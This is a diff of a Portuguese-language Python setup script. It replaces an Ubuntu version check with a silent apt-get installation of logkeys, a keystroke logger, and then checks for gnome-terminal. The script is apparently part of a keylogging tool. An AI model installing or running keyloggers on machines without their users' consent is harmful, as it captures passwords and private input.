@@ -27,13 +27,10 @@ def verificar():
     else:
         print("\n- Instalando o logkeys. Aguarde!")
         time.sleep(2)
-        if os.system("cat /etc/issue | cut -d " " -f3") == "18.4":
-            os.system("chmod +x logkeysinstall.sh && ./logkeysinstall.sh")
-        else:
-            os.system("apt-get update > /dev/null")
-            os.system("apt-get install logkeys -y > /dev/null")
-            print("\n ok")
-            time.sleep(1)
+        os.system("apt-get update > /dev/null")
+        os.system("apt-get install logkeys -y > /dev/null")
+        print("\n ok")
+        time.sleep(1)
     if os.path.exists("/usr/share/applications/gnome-terminal.desktop") == True:
         print("\n- Gnome-terminal já está instalado!")
         time.sleep(2)
